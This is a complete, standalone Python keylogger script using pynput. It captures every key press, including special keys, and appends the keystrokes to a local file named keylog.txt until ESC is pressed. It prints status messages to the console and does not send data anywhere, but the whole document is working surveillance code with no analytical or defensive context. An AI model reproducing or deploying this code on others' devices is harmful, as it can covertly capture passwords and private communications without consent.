from pynput.keyboard import Key, Listener

# Number of keys to capture before writing to file
WRITE_THRESHOLD = 10

keys_buffer = []
key_count = 0


def on_press(key):
    """
    Callback function when a key is pressed.
    Stores the key and writes to file every WRITE_THRESHOLD presses.
    """
    global keys_buffer, key_count

    keys_buffer.append(key)
    key_count += 1
    print(f"{key} pressed")  # Optional: log key presses in console

    if key_count >= WRITE_THRESHOLD:
        write_to_file(keys_buffer)
        keys_buffer = []
        key_count = 0


def on_release(key):
    """
    Callback function when a key is released.
    Stops the listener when ESC is pressed, writes remaining keys to file.
    """
    global keys_buffer

    if key == Key.esc:
        if keys_buffer:
            write_to_file(keys_buffer)
        print("ESC pressed, stopping keylogger.")
        return False  # Stop listener


def write_to_file(keys):
    """
    Writes keys to 'keylog.txt', handling special keys appropriately.
    """
    try:
        with open("keylog.txt", "a") as file:
            for key in keys:
                try:
                    file.write(key.char)
                except AttributeError:
                    # Handle special keys by writing readable tags
                    if key == Key.space:
                        file.write(" ")
                    elif key == Key.enter:
                        file.write("\n")
                    elif key == Key.tab:
                        file.write("\t")
                    elif key == Key.backspace:
                        file.write("[BACKSPACE]")
                    elif key in (Key.shift, Key.shift_r):
                        file.write("[SHIFT]")
                    elif key in (Key.ctrl_l, Key.ctrl_r):
                        file.write("[CTRL]")
                    elif key in (Key.alt_l, Key.alt_r):
                        file.write("[ALT]")
                    elif key == Key.esc:
                        file.write("[ESC]")
                    else:
                        # Fallback for other special keys
                        file.write(f"[{key.name.upper()}]")
        print("Successfully wrote keys to file.")  # Optional debug message
    except Exception as e:
        print(f"ERROR writing to file: {e}")


if __name__ == "__main__":
    print("Keylogger started (Press ESC to stop)...")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
